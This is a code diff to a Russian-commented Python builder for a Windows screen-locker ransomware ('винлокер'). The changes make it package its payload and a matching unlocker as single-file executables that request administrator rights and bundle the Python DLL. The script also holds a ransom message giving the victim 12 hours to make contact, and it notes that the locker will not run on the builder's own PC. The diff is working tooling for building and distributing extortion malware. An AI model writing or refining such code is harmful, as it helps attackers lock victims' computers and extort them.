@@ -3,6 +3,7 @@ import sys
 import subprocess
 import socket
 import getpass
+import sysconfig
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 os.chdir(BASE_DIR)
@@ -47,6 +48,29 @@ def ensure_dependencies():
             subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=False)
 
 ensure_dependencies()
+
+# ---------- ИЩЕМ python3XX.dll ----------
+def find_python_dll():
+    candidates = []
+    # Рядом с python.exe
+    py_dir = os.path.dirname(sys.executable)
+    candidates.append(os.path.join(py_dir, f"python{sys.version_info.major}{sys.version_info.minor}.dll"))
+    # В DLLs
+    dlls_dir = os.path.join(py_dir, "DLLs")
+    candidates.append(os.path.join(dlls_dir, f"python{sys.version_info.major}{sys.version_info.minor}.dll"))
+    # В sysconfig
+    try:
+        base = sysconfig.get_config_var("installed_base") or sysconfig.get_config_var("base")
+        if base:
+            candidates.append(os.path.join(base, f"python{sys.version_info.major}{sys.version_info.minor}.dll"))
+    except: pass
+    for c in candidates:
+        if c and os.path.exists(c):
+            return c
+    return None
+
+PYTHON_DLL = find_python_dll()
+print(f"[*] python DLL: {PYTHON_DLL}")
 
 CONTACTS_BLOCK = f"""                                                    Сейчас у тебя 12 часов, чтобы написать мне:  
                                                     ▸ {contact}  
@@ -437,10 +461,13 @@ print("[+] Созданы volt_payload.py и unlocker.py")
 print("\n[*] Собираю", OUTPUT_NAME + ".exe ...")
 cmd1 = [
     sys.executable, "-m", "PyInstaller",
-    "--noconfirm", "--onedir", "--windowed", "--uac-admin",
+    "--noconfirm", "--onefile", "--windowed", "--uac-admin",
     "--name", OUTPUT_NAME,
     "volt_payload.py"
 ]
+if PYTHON_DLL:
+    cmd1.insert(-3, "--add-binary")
+    cmd1.insert(-3, f"{PYTHON_DLL};.")
 if ICON_FILE:
     cmd1.insert(-3, "--icon")
     cmd1.insert(-3, ICON_FILE)
@@ -449,10 +476,13 @@ subprocess.run(cmd1)
 print("\n[*] Собираю Unlocker.exe ...")
 cmd2 = [
     sys.executable, "-m", "PyInstaller",
-    "--noconfirm", "--onedir", "--windowed", "--uac-admin",
+    "--noconfirm", "--onefile", "--windowed", "--uac-admin",
     "--name", "Unlocker",
     "unlocker.py"
 ]
+if PYTHON_DLL:
+    cmd2.insert(-3, "--add-binary")
+    cmd2.insert(-3, f"{PYTHON_DLL};.")
 if ICON_FILE:
     cmd2.insert(-3, "--icon")
     cmd2.insert(-3, ICON_FILE)
@@ -469,7 +499,6 @@ for f in ["volt_payload.py", "unlocker.py", "build_all.py", "selfbuild.py", "lau
 print("\n" + "=" * 60)
 print("  ГОТОВО!")
 print("=" * 60)
-print(f"\n  dist\\{OUTPUT_NAME}\\{OUTPUT_NAME}.exe  — винлокер")
-print(f"  dist\\Unlocker\\Unlocker.exe              — чистильщик")
-print(f"\n[!] Отправляй ВСЮ папку (exe + _internal), не только exe.")
-print(f"[!] На этом ПК ({CURRENT_PC_NAME}\\{CURRENT_USER}) винлокер не запустится")
+print(f"\n  dist\\{OUTPUT_NAME}.exe  — винлокер")
+print(f"  dist\\Unlocker.exe         — чистильщик")
+print(f"\n[!] На этом ПК ({CURRENT_PC_NAME}\\{CURRENT_USER}) винлокер не запустится")
